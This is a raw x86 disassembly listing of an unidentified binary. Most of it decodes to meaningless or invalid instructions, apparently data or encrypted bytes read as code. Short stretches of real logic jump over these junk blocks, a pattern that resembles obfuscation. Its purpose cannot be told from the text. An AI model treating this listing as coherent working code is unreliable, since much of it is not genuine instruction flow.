  40adcb:	aam    0x30
  40adcd:	jo     0x40ade4
  40adcf:	call   0xae0d8bb
  40add4:	fiadd  WORD PTR [ebx+0x28]
  40add7:	sbb    edi,DWORD PTR [edi-0x52]
  40adda:	ja     0x40ae57
  40addc:	daa    
  40addd:	enter  0x2b1f,0xcb
  40ade1:	arpl   WORD PTR [ebx-0x1bad92c1],sp
  40ade7:	sbb    ebx,DWORD PTR ds:0x47851ea1
  40aded:	mov    bh,0xec
  40adef:	stc    
  40adf0:	stos   DWORD PTR es:[edi],eax
  40adf1:	ret    0xef23
  40adf4:	pusha  
  40adf5:	jnp    0x40adfb
  40adf7:	cld    
  40adf8:	push   eax
  40adf9:	ds out dx,al
  40adfb:	hlt    
  40adfc:	call   0x4c4ccd06
  40ae01:	sbb    al,0x9
  40ae03:	clc    
  40ae04:	mov    ebx,0x5d0e0475
  40ae09:	retf   0x132d
  40ae0c:	scas   al,BYTE PTR es:[edi]
  40ae0d:	iret   
  40ae0e:	add    DWORD PTR [ebp+0x7f],ecx
  40ae11:	into   
  40ae12:	xchg   ebx,eax
  40ae13:	mov    ecx,0xc99cf7b2
  40ae18:	inc    ebx
  40ae19:	out    dx,eax
  40ae1a:	sahf   
  40ae1b:	sbb    eax,0x29297d8c
  40ae20:	dec    eax
  40ae21:	(bad)  
  40ae22:	pop    esp
  40ae23:	(bad)  
  40ae24:	repnz es jmp 0x853:0x57a4
  40ae2c:	lahf   
  40ae2d:	in     eax,dx
  40ae2e:	and    al,BYTE PTR [edi]
  40ae30:	sub    DWORD PTR [ebx+eax*4-0x3d],0x57
  40ae35:	xor    esi,ebx
  40ae37:	sub    al,0x5a
  40ae39:	gs mov edi,0x753424fd
  40ae3f:	paddq  mm6,QWORD PTR [eax]
  40ae42:	and    cl,dl
  40ae44:	push   ds
  40ae45:	mov    eax,ds:0xfe57767b
  40ae4a:	adc    dh,BYTE PTR [esi-0x3e]
  40ae4d:	icebp  
  40ae4e:	fmulp  st(0),st
  40ae50:	out    0x68,eax
  40ae52:	mov    bl,0x66
  40ae54:	dec    ebp
  40ae55:	test   eax,0x7cdd9341
  40ae5a:	in     al,dx
  40ae5b:	xor    eax,0x14cede75
  40ae60:	mov    ch,0x9
  40ae62:	lea    esi,[esi]
  40ae64:	add    eax,0x83e08056
  40ae69:	outs   dx,DWORD PTR ds:[esi]
  40ae6a:	mov    esp,0xb391ea13
  40ae6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae70:	arpl   sp,si
  40ae72:	in     eax,0x1a
  40ae74:	jnp    0x40aea6
  40ae76:	adc    cl,BYTE PTR [ebp+0x77]
  40ae79:	test   DWORD PTR [edx],eax
  40ae7b:	cmp    eax,DWORD PTR [ebx]
  40ae7d:	mov    ebp,0xe4788240
  40ae82:	sub    al,0xeb
  40ae84:	push   ss
  40ae85:	mov    dl,0x79
  40ae87:	pop    ecx
  40ae88:	sub    dl,0xd4
  40ae8b:	inc    ecx
  40ae8c:	mov    eax,ds:0xe859b419
  40ae91:	cmc    
  40ae92:	fisub  DWORD PTR ds:0x3f68e757
  40ae98:	ds push ebp
  40ae9a:	mov    ah,0xc7
  40ae9c:	shl    BYTE PTR [edi],cl
  40ae9e:	out    0xf4,eax
  40aea0:	fist   WORD PTR [ecx]
  40aea2:	ins    BYTE PTR es:[edi],dx
  40aea3:	jg     0x40ae7c
  40aea5:	mov    DWORD PTR [edx+eax*2+0x57],ebx
  40aea9:	sbb    al,0x35
  40aeab:	test   eax,0x736da9f1
  40aeb0:	jno    0x40ae59
  40aeb2:	adc    al,0x22
  40aeb4:	mov    al,ds:0xdcf7944d
  40aeb9:	rol    DWORD PTR [edx+eax*2-0x48],cl
  40aebd:	xchg   ebp,eax
  40aebe:	inc    ecx
  40aebf:	shl    DWORD PTR [edi],cl
  40aec1:	loopne 0x40ae99
  40aec3:	pop    ss
  40aec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aec5:	test   bl,0x5d
  40aec8:	outs   dx,BYTE PTR ds:[esi]
  40aec9:	mov    eax,edx
  40aecb:	jnp    0x40aec8
  40aecd:	xchg   ebx,eax
  40aece:	push   esi
  40aecf:	popf   
  40aed0:	cwde   
  40aed1:	push   eax
  40aed2:	mov    edi,ds
  40aed4:	js     0x40aec6
  40aed6:	mov    DWORD PTR [esi+0x32],ebx
  40aed9:	jb     0x40aec0
  40aedb:	mov    ebx,0x57f23b79
  40aee0:	js     0x40aece
  40aee2:	dec    edi
  40aee3:	jnp    0x40aeac
  40aee5:	sub    DWORD PTR [ebp+0x5f],ebx
  40aee8:	adc    cl,BYTE PTR [esi+0x60f398a3]
  40aeee:	je     0x40aeae
  40aef0:	jbe    0x40ae88
  40aef2:	sub    dl,ch
  40aef4:	imul   edi,DWORD PTR [edi+0x17d5b7f2],0x163ea5d2
  40aefe:	lds    edi,FWORD PTR [ebx]
  40af00:	cli    
  40af01:	repnz mov fs:0x3d5547d6,eax
  40af08:	(bad)  
  40af09:	jle    0x40af84
  40af0b:	adc    BYTE PTR [ecx+ecx*8+0x2788e2fc],cl
  40af12:	pop    ecx
  40af13:	aaa    
  40af14:	scas   eax,DWORD PTR es:[edi]
  40af15:	ins    BYTE PTR es:[edi],dx
  40af16:	icebp  
  40af17:	push   eax
  40af18:	ins    DWORD PTR es:[edi],dx
  40af19:	das    
  40af1a:	gs push eax
  40af1c:	and    ebx,edi
  40af1e:	pusha  
  40af1f:	call   0xdd4d30b0
  40af24:	inc    ecx
  40af25:	adc    al,0x8f
  40af27:	callw  0xc1d6
  40af2b:	dec    edx
  40af2c:	gs cmp eax,0x483b42c8
  40af32:	push   ecx
  40af33:	adc    DWORD PTR [ecx],ecx
  40af35:	pop    edi
  40af36:	pop    esp
  40af37:	mov    ds:0x62c9ceb6,al
  40af3c:	inc    ebp
  40af3d:	inc    ecx
  40af3e:	aas    
  40af3f:	mov    cl,BYTE PTR [edx+0x762dfabc]
  40af45:	ds mov ecx,0xf74fcb31
  40af4b:	cmp    al,0xf6
  40af4d:	xchg   eax,edx
  40af4f:	dec    eax
  40af50:	in     eax,dx
  40af51:	cmp    edx,DWORD PTR [esi-0x4c]
  40af54:	push   ds
  40af55:	dec    esp
  40af56:	and    al,0x15
  40af58:	sub    ch,ah
  40af5a:	stc    
  40af5b:	(bad)  ds:0xc3ac35ab
  40af61:	out    dx,eax
  40af62:	mov    esp,0xe8bb4559
  40af67:	add    ebp,DWORD PTR [ebx+0x4e77bb26]
  40af6d:	inc    esi
  40af6e:	shr    DWORD PTR [eax],1
  40af70:	or     DWORD PTR [ebx-0x367ee7c0],ecx
  40af76:	sbb    BYTE PTR [eax+0x0],dh
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x433727
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x4336df
  40af93:	sub    DWORD PTR ds:0x43368f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x4336db,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x4336db
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x4336db,ecx
  40afb8:	cmp    DWORD PTR ds:0x4336db,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x4336db,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x4336db,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x4336db
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x4336db,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x433727,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	push   0xffffffc3
  40b019:	push   edi
  40b01a:	and    esp,DWORD PTR [edi+esi*8+0x7e]
  40b01e:	jle    0x40b058
  40b020:	jl     0x40b0a0
  40b022:	jle    0x40b04f
  40b024:	pop    edx
  40b025:	icebp  
  40b026:	arpl   WORD PTR [esi+0x4ba11ecb],ax
  40b02c:	mov    ebx,0xd0e3deb0
  40b031:	imul   DWORD PTR [ecx+0x7b3b7dd]
  40b037:	stos   BYTE PTR es:[edi],al
  40b038:	repz leave 
  40b03a:	push   esp
  40b03b:	mov    ds:0xa8e904d9,al
  40b040:	add    ebx,DWORD PTR [edi+0x229933]
  40b046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b047:	add    esp,ebp
  40b049:	sub    ebp,eax
  40b04b:	mov    ecx,0x5536e283
  40b050:	ret    
  40b051:	cld    
  40b052:	add    bl,BYTE PTR [ebx-0x14480963]
  40b058:	inc    edx
  40b059:	mov    ah,BYTE PTR [ecx]
  40b05b:	psllw  mm6,QWORD PTR [eax-0x23]
  40b05f:	push   ebp
  40b060:	xor    dh,dh
  40b062:	cmp    eax,0xc408388c
  40b067:	sbb    BYTE PTR [edi+esi*4-0x44],cl
  40b06b:	in     al,0x39
  40b06d:	frstor [ebp-0x9]
  40b070:	scas   al,BYTE PTR es:[edi]
  40b071:	test   BYTE PTR [esi-0x27],cl
  40b074:	pop    esi
  40b075:	xor    BYTE PTR [ebx-0xc],0x52
  40b079:	jg     0x40b0d2
  40b07b:	jbe    0x40b0f5
  40b07d:	loop   0x40b0e7
  40b07f:	mov    esi,edx
  40b081:	push   edi
  40b082:	repnz xchg ebp,eax
  40b084:	aaa    
  40b085:	mov    bl,BYTE PTR [ebx+0x229ba87d]
  40b08b:	pop    ebx
  40b08c:	mov    esp,0xe995b6df
  40b091:	test   BYTE PTR [ecx-0x25bff11],ah
  40b097:	add    bl,bl
  40b099:	mov    esp,0x9a48ee3a
  40b09e:	pushf  
  40b09f:	ret    
  40b0a0:	jne    0x40b0d5
  40b0a2:	push   0xffffffe6
  40b0a4:	cli    
  40b0a5:	sti    
  40b0a6:	sbb    DWORD PTR [ebx],eax
  40b0a8:	aas    
  40b0a9:	cmp    BYTE PTR [edi+0x1f],al
  40b0ac:	mov    esp,0x9a69e7df
  40b0b1:	inc    ebp
  40b0b2:	pop    eax
  40b0b3:	pop    ebp
  40b0b4:	mov    dl,0x17
  40b0b6:	xchg   edi,eax
  40b0b7:	jo     0x40b117
  40b0b9:	(bad)  
  40b0ba:	push   edx
  40b0bb:	push   ebx
  40b0bc:	cwde   
  40b0bd:	loopne 0x40b0bd
  40b0bf:	inc    esp
  40b0c0:	dec    ebx
  40b0c1:	xchg   esi,eax
  40b0c2:	fmul   DWORD PTR [ecx-0x5efd6cda]
  40b0c8:	xor    DWORD PTR [edi-0x148c65fa],esi
  40b0ce:	hlt    
  40b0cf:	cmp    edi,DWORD PTR [ebp+0x59]
  40b0d2:	addr16 (bad) 
  40b0d4:	mov    WORD PTR [esi-0x3],?
  40b0d7:	jmp    0x40b13a
  40b0d9:	cmp    cl,dh
  40b0db:	jnp    0x40b156
  40b0dd:	(bad)  
  40b0df:	inc    edx
  40b0e0:	sub    dh,bh
  40b0e2:	fucomip st,st(5)
  40b0e4:	sub    eax,0x74fbe58e
  40b0e9:	retf   0xe228
  40b0ec:	dec    esp
  40b0ed:	add    al,0xff
  40b0ef:	push   0xffffff92
  40b0f1:	lods   eax,DWORD PTR ds:[esi]
  40b0f2:	pop    edx
  40b0f3:	jb     0x40b162
  40b0f5:	jle    0x40b14c
  40b0f7:	sub    eax,DWORD PTR [ebx+0x5c]
  40b0fa:	jmp    0x40b081
  40b0fc:	(bad)  
  40b0fd:	fnstcw WORD PTR [edi+eiz*8+0x3b]
  40b101:	and    DWORD PTR [ecx-0x67],esi
  40b104:	aas    
  40b105:	mov    al,0x1e
  40b107:	mov    ebp,?
  40b109:	pop    edi
  40b10a:	xor    DWORD PTR [esi],edi
  40b10c:	dec    esi
  40b10d:	hlt    
  40b10e:	je     0x40b0ea
  40b110:	push   ss
  40b111:	adc    bh,dh
  40b113:	jne    0x40b170
  40b115:	sub    eax,0x94c149ab
  40b11a:	loope  0x40b185
  40b11c:	jae    0x40b162
  40b11e:	mov    ds,WORD PTR [ecx+0x71]
  40b121:	pusha  
  40b122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b123:	pop    ds
  40b124:	in     al,dx
  40b125:	sar    BYTE PTR [edi-0x795df937],cl
  40b12b:	je     0x40b0c9
  40b12d:	jp     0x40b174
  40b12f:	hlt    
  40b130:	sbb    ebx,eax
  40b132:	mov    dl,0x47
  40b134:	pop    ss
  40b135:	or     eax,0x466b493a
  40b13a:	stos   DWORD PTR es:[edi],eax
  40b13b:	push   ebp
  40b13c:	push   ebp
  40b13d:	xor    eax,0x13baf9d4
  40b142:	jno    0x40b16f
  40b144:	data16 jae 0x40b18a
  40b147:	jae    0x40b0ee
  40b149:	cmp    DWORD PTR [ebp-0x7e],esi
  40b14c:	loop   0x40b139
  40b14e:	jb     0x40b19d
  40b150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b151:	out    0xf7,eax
  40b153:	imul   esp,DWORD PTR [edx],0xffffffa4
  40b156:	addr16 sub al,0xb8
  40b159:	es add ah,bh
  40b15c:	push   edx
  40b15d:	jno    0x40b193
  40b15f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b160:	in     eax,0x46
  40b162:	dec    ebp
  40b163:	jnp    0x40b1d5
  40b165:	xchg   edi,eax
  40b166:	mov    eax,0x94feaa92
  40b16b:	cmp    ah,BYTE PTR [esp+edi*8]
  40b16e:	call   0xef89:0xf38fcd32
  40b175:	xor    BYTE PTR [esi],dl
  40b177:	fdiv   DWORD PTR [ecx]
  40b179:	or     bl,BYTE PTR [edx]
  40b17b:	xlat   BYTE PTR ds:[ebx]
  40b17c:	out    0xb7,al
  40b17e:	jle    0x40b16d
  40b180:	sti    
  40b181:	cmp    cl,BYTE PTR [ecx-0x4c]
  40b184:	ret    0xdfe0
  40b187:	fadd   QWORD PTR [ecx+0x7509cd6a]
  40b18d:	lods   al,BYTE PTR ds:[esi]
  40b18e:	add    eax,DWORD PTR [ebx-0x4a]
  40b191:	inc    esp
  40b192:	xchg   ebx,eax
  40b193:	jb     0x40b16b
  40b195:	ss mov esp,0x7481daa3
  40b19b:	jnp    0x40b147
  40b19d:	cmp    DWORD PTR [ebp+0x43],edx
  40b1a0:	mov    ss,WORD PTR [eax+ecx*1-0x6ed62b41]
  40b1a7:	out    dx,eax
  40b1a8:	dec    esi
  40b1a9:	adc    DWORD PTR [eax],edx
  40b1ab:	(bad)
  40b1ae:	sub    bl,BYTE PTR [edx-0x417f9b0a]
  40b1b4:	sub    bl,ah
  40b1b6:	mov    ah,0xaa
  40b1b8:	loope  0x40b1a0
  40b1ba:	nop
  40b1bb:	pop    eax
  40b1bc:	mov    esp,0x5a10549e
  40b1c1:	add    al,0x6d
  40b1c3:	outs   dx,DWORD PTR ds:[esi]
  40b1c4:	dec    ebp
  40b1c5:	fst    QWORD PTR [ebp-0x8]
  40b1c8:	sub    al,0x59
  40b1ca:	mov    esp,0x8a8208e4
  40b1cf:	pushf  
  40b1d0:	test   BYTE PTR [eax-0x62],0xa6
  40b1d4:	retf   
  40b1d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1d6:	fwait
  40b1d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1d8:	test   dh,ah
  40b1da:	inc    esp
  40b1db:	out    0x87,al
  40b1dd:	sbb    DWORD PTR [eax+0x29a3b190],ecx
  40b1e3:	aas    
  40b1e4:	sbb    al,BYTE PTR [edx+0x10]
  40b1e7:	pop    esi
  40b1e8:	jo     0x40b21d
  40b1ea:	and    dl,BYTE PTR [edx]
  40b1ec:	and    bh,BYTE PTR [ebx+0x6a31e60f]
  40b1f2:	mov    al,0x96
  40b1f4:	inc    edi
  40b1f5:	push   edi
  40b1f6:	dec    edx
  40b1f7:	fcomp  DWORD PTR [esi-0x2c026bdc]
  40b1fd:	and    DWORD PTR [ebp+0x79],esi
  40b200:	std    
  40b201:	and    dl,dl
  40b203:	jecxz  0x40b255
  40b205:	inc    esp
  40b206:	cdq    
  40b207:	or     al,0xe8
  40b209:	int3   
  40b20a:	jbe    0x40b214
  40b20c:	or     eax,0x51060644
  40b211:	sar    DWORD PTR [esi-0x64],0x2f
  40b215:	(bad)  
  40b216:	xor    BYTE PTR [esi+eax*2-0x3c9a5469],0x37
  40b21e:	pushf  
  40b21f:	mov    ebx,cs
  40b221:	sub    eax,0xae97f0e9
  40b226:	mov    ds:0xdb35d0e3,eax
  40b22b:	cmp    ch,bh
  40b22d:	std    
  40b22e:	push   esp
  40b22f:	inc    ecx
  40b230:	push   edi
  40b231:	retf   
  40b232:	fcom   QWORD PTR [edx]
  40b234:	cli    
  40b235:	xacquire xchg BYTE PTR [edi],cl
  40b238:	and    al,0x76
  40b23a:	push   edx
  40b23b:	test   DWORD PTR [ebx-0x7d],esi
  40b23e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b23f:	popa   
  40b240:	or     al,0xe5
  40b242:	out    0xe6,eax
  40b244:	test   eax,0x98a1ca14
  40b249:	or     ebp,DWORD PTR [esi-0x6ae8341f]
  40b24f:	mov    esi,0xa6691d38
  40b254:	repnz pop ss
  40b256:	stos   BYTE PTR es:[edi],al
  40b257:	ss std 
  40b259:	xlat   BYTE PTR ds:[ebx]
  40b25a:	inc    ebx
  40b25b:	mov    ah,0x6f
  40b25d:	cdq    
  40b25e:	div    BYTE PTR [eax-0x42]
  40b261:	aas    
  40b262:	dec    BYTE PTR [ebx+0x24d722e4]
  40b268:	cli    
  40b269:	mov    eax,DWORD PTR [ebp-0x14]
  40b26c:	mov    ecx,DWORD PTR [ebp+0x8]
  40b26f:	add    ecx,DWORD PTR [eax+0x24]
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	dec    ecx
  40b284:	jnp    0x40b23e
  40b286:	sub    BYTE PTR [esi],0xf2
  40b289:	jle    0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b290:	enter  0x46ff,0x51
  40b294:	xchg   ebp,eax
  40b295:	js     0x40b2cc
  40b297:	jg     0x40b2d8
  40b299:	and    bl,BYTE PTR [edi-0x46]
  40b29c:	jle    0x40b2ac
  40b29e:	pop    es
  40b29f:	mov    ds:0x73219dc,al
  40b2a4:	jo     0x40b227
  40b2a6:	mov    cl,0x5e
  40b2a8:	leave  
  40b2a9:	mov    bl,0x8b
  40b2ab:	mov    ebx,0x7d54a26b
  40b2b0:	int3   
  40b2b1:	jg     0x40b2bc
  40b2b3:	(bad)  [esp+edx*1]
  40b2b6:	shl    DWORD PTR [ecx],1
  40b2b8:	and    eax,esi
  40b2ba:	(bad)  
  40b2bb:	dec    edi
  40b2bc:	hlt    
  40b2bd:	xchg   edx,eax
  40b2be:	adc    al,0x14
  40b2c0:	ins    DWORD PTR es:[edi],dx
  40b2c1:	sub    al,0xc7
  40b2c3:	xor    eax,0xb7b5d911
  40b2c8:	inc    edx
  40b2c9:	idiv   esi
  40b2cb:	fsub   DWORD PTR [ebp+0x64]
  40b2ce:	pop    esi
  40b2cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2d0:	mov    ebp,0x763cc45d
  40b2d5:	sub    ebx,edi
  40b2d7:	fcomp  DWORD PTR [edi-0x3e]
  40b2da:	fs mov cl,0xd9
  40b2dd:	pop    ebx
  40b2de:	or     al,0x3
  40b2e0:	pop    edx
  40b2e1:	loope  0x40b308
  40b2e3:	mov    ecx,0x853d27cb
  40b2e8:	add    al,0x74
  40b2ea:	in     al,dx
  40b2eb:	push   es
  40b2ec:	or     al,0xf
  40b2ee:	in     eax,0xaa
  40b2f0:	mov    ds:0x111ce303,eax
  40b2f5:	sub    bh,BYTE PTR [eax]
  40b2f7:	mov    bh,0xc0
  40b2f9:	push   0x1a
  40b2fb:	mov    ebx,0xcfb986dd
  40b300:	or     al,0x12
  40b302:	mov    eax,ds:0xb02600d3
  40b307:	pop    es
  40b308:	or     ecx,eax
  40b30a:	mov    al,ds:0xfccaaa8a
  40b30f:	(bad)  
  40b310:	(bad)  
  40b312:	mov    dl,0xeb
  40b314:	inc    edx
  40b315:	pop    eax
  40b316:	mov    ch,BYTE PTR [ecx-0x3ebf8aaf]
  40b31c:	inc    esp
  40b31d:	pushf  
  40b31e:	dec    ebx
  40b31f:	push   ebp
  40b320:	xchg   edx,eax
  40b321:	in     al,0xea
  40b323:	mov    ecx,es
  40b325:	test   DWORD PTR fs:[ecx+ebp*2],0xa0401d57
  40b32d:	or     BYTE PTR [ecx+0x76fe3545],0x30
  40b334:	dec    esi
  40b335:	or     bh,BYTE PTR [eax]
  40b337:	(bad)  
  40b338:	scas   al,BYTE PTR es:[edi]
  40b339:	jmp    0x729a:0x8a5440ee
  40b340:	js     0x40b32f
  40b342:	es mov esi,ebx
  40b345:	aaa    
  40b346:	cmp    edi,edi
  40b348:	pop    esp
  40b349:	sbb    DWORD PTR [edx-0x495d64c5],eax
  40b34f:	pop    edx
  40b350:	enter  0xfb0a,0x3a
  40b354:	xor    eax,DWORD PTR [eax+0x51]
  40b357:	push   0x198da6cc
  40b35c:	jnp    0x40b317
  40b35e:	pop    ebx
  40b35f:	or     esp,DWORD PTR [ebx-0x3429a2af]
  40b365:	push   0xac4bbe0c
  40b36a:	(bad)  [ebx+edi*4]
  40b36d:	loopne 0x40b36b
  40b36f:	xor    edx,esp
  40b371:	dec    edi
  40b372:	cmp    bh,BYTE PTR [ebx]
  40b374:	jb     0x40b3ce
  40b376:	push   0x19089611
  40b37b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b37c:	mov    al,ds:0x737b00b8
  40b381:	inc    ebx
  40b382:	xchg   ecx,eax
  40b383:	mov    dl,0x53
  40b385:	and    edx,0x443ee0c3
  40b38b:	cmp    DWORD PTR [esi+0x6a675887],esi
  40b391:	lock push edi
  40b393:	(bad)  
  40b394:	ins    BYTE PTR es:[edi],dx
  40b395:	dec    edi
  40b396:	jle    0x40b3c7
  40b398:	or     bh,al
  40b39a:	add    BYTE PTR [eax+ebp*4-0x25dd606a],0x69
  40b3a2:	into   
  40b3a3:	pop    esi
  40b3a4:	out    0xa6,al
  40b3a6:	and    DWORD PTR [edi],edi
  40b3a8:	loopne 0x40b428
  40b3aa:	sub    esp,DWORD PTR [esi-0x758b2f0c]
  40b3b0:	lods   eax,DWORD PTR ds:[esi]
  40b3b1:	push   edx
  40b3b2:	lods   eax,DWORD PTR ds:[esi]
  40b3b3:	and    DWORD PTR cs:[edx-0x59],edx
  40b3b7:	daa    
  40b3b8:	adc    BYTE PTR [edx-0x1f],ah
  40b3bb:	dec    edx
  40b3bc:	mov    ds:0x6f96a0ed,eax
  40b3c1:	imul   esp,DWORD PTR [ecx],0x6d
  40b3c4:	cmc    
  40b3c5:	adc    esi,DWORD PTR [edx-0x5b30f2c1]
  40b3cb:	cld    
  40b3cc:	lahf   
  40b3cd:	mov    ecx,0x73af9ece
  40b3d2:	retf   0x5df
  40b3d5:	mov    ds:0x98d76f8c,al
  40b3da:	mov    eax,0xab4d8fec
  40b3df:	sub    BYTE PTR [edi+edx*4],dh
  40b3e2:	or     eax,0xa446715
  40b3e7:	ficom  DWORD PTR [edx+0x1d]
  40b3ea:	push   ds
  40b3eb:	stos   BYTE PTR es:[edi],al
  40b3ec:	dec    ecx
  40b3ed:	sbb    esp,ebx
  40b3ef:	mov    ebx,0xae723628
  40b3f4:	xor    al,0x3b
  40b3f6:	and    al,bl
  40b3f8:	pop    ebx
  40b3f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3fb:	fisub  DWORD PTR [eax+0x73005e98]
  40b401:	push   ecx
  40b402:	push   ds
  40b403:	dec    edx
  40b404:	mov    DWORD PTR [esi],edx
  40b406:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b408:	in     eax,0xfc
  40b40a:	inc    esp
  40b40b:	push   ecx
  40b40c:	add    al,0x43
  40b40e:	jo     0x40b446
  40b410:	xor    ebx,DWORD PTR [ebx+0x3e]
  40b413:	test   eax,0x9fe462c
  40b418:	pop    edx
  40b419:	(bad)  
  40b41a:	cmp    bh,BYTE PTR [esi-0x4]
  40b41d:	xchg   esi,eax
  40b41e:	mov    ah,0xb0
  40b420:	mov    edx,edx
  40b422:	mov    WORD PTR [edi+esi*1+0xa],gs
  40b426:	jns    0x40b462
  40b428:	push   es
  40b429:	or     eax,0xbb2a7b30
  40b42e:	sar    BYTE PTR [ebx+ebp*2+0x335f281b],1
  40b435:	cld    
  40b436:	fwait
  40b437:	push   0x3597adbf
  40b43c:	rcl    DWORD PTR [ecx+0x103b6ce3],0xcf
  40b443:	bound  esi,QWORD PTR ss:[ebx]
  40b446:	jo     0x40b3f5
  40b448:	(bad)  
  40b449:	mov    ds:0x4795bc00,eax
  40b44e:	fld    QWORD PTR [ebx+eax*4+0x56]
  40b452:	cmc    
  40b453:	fstp   TBYTE PTR [ebp-0x622ae7b5]
  40b459:	stos   DWORD PTR es:[edi],eax
  40b45a:	fldenv [esi-0x17]
  40b45d:	enter  0xd9df,0xd7
  40b461:	push   ecx
  40b462:	pop    esp
  40b463:	mov    eax,ds:0x63037a
  40b468:	pop    esp
  40b469:	into   
  40b46a:	shr    ecx,1
  40b46c:	rol    BYTE PTR [eax+esi*8],cl
  40b46f:	pop    ss
  40b470:	dec    edx
  40b471:	es jl  0x40b46c
  40b474:	push   ebp
  40b475:	sbb    eax,0xf256d5cd
  40b47a:	sbb    BYTE PTR [esi-0x44],ah
  40b47d:	ret    
  40b47e:	call   0xd1d5:0x741aea2b
  40b485:	push   edx
  40b486:	ss (bad) 
  40b488:	in     eax,0x80
  40b48a:	jbe    0x40b4c9
  40b48c:	lea    edx,[esi]
  40b48e:	cmp    ebx,DWORD PTR [eax]
  40b490:	xlat   BYTE PTR ds:[ebx]
  40b491:	out    dx,eax
  40b492:	or     al,0x18
  40b494:	ins    BYTE PTR es:[edi],dx
  40b495:	xor    BYTE PTR [esi*4-0x5377778b],ch
  40b49c:	xor    eax,0x98c93fe8
  40b4a1:	pop    ecx
  40b4a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4a3:	fs mov bl,0xc5
  40b4a6:	div    DWORD PTR [eax]
  40b4a8:	sar    BYTE PTR [edi-0x9ae556b],1
  40b4ae:	(bad)  
  40b4af:	iret   
  40b4b0:	clc    
  40b4b1:	(bad)  
  40b4b2:	fisub  DWORD PTR [edx-0x38]
  40b4b5:	jns    0x40b4ac
  40b4b7:	aad    0x52
  40b4b9:	or     eax,0x25a08e7
  40b4be:	call   0x30be5c8
  40b4c3:	stc    
  40b4c4:	xchg   ecx,eax
  40b4c5:	sbb    ch,dh
  40b4c7:	xor    cl,cl
  40b4c9:	inc    ebx
  40b4ca:	mov    ah,0x43
  40b4cc:	adc    DWORD PTR ds:0x5f0cd779,ebp
  40b4d2:	inc    esi
  40b4d3:	cs add eax,0x8bd44d89
  40b4d9:	inc    ebp
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	mov    ebp,DWORD PTR [esi]
  40b509:	in     al,0xef
  40b50b:	call   0x38bf3400
  40b510:	jl     0x40b590
  40b512:	jle    0x40b51e
  40b514:	mov    eax,ds:0xa1684621
  40b519:	outs   dx,BYTE PTR ds:[esi]
  40b51a:	lock icebp 
  40b51c:	fisttp QWORD PTR [ecx-0x2d44565]
  40b522:	sbb    ebp,DWORD PTR [eax-0x77bfdcce]
  40b528:	(bad)  
  40b529:	aam    0x9
  40b52b:	pop    edi
  40b52c:	and    dl,cl
  40b52e:	add    al,0xb9
  40b530:	mov    bl,0xf
  40b532:	xchg   ebx,eax
  40b534:	add    esp,DWORD PTR ds:0x4a921538
  40b53a:	js     0x40b4c4
  40b53c:	inc    eax
  40b53d:	push   ecx
  40b53e:	mov    ds:0x6c16979a,eax
  40b543:	test   BYTE PTR [edx+0x43ec2c23],bl
  40b549:	mov    edi,0xd4299355
  40b54e:	clc    
  40b54f:	adc    edx,DWORD PTR [edx+0x473fec28]
  40b555:	push   cs
  40b556:	jg     0x40b4f0
  40b558:	pop    esp
  40b559:	or     ebx,DWORD PTR [edi]
  40b55b:	adc    dl,0xfe
  40b55e:	test   DWORD PTR [ebx+0x5e543d4b],eax
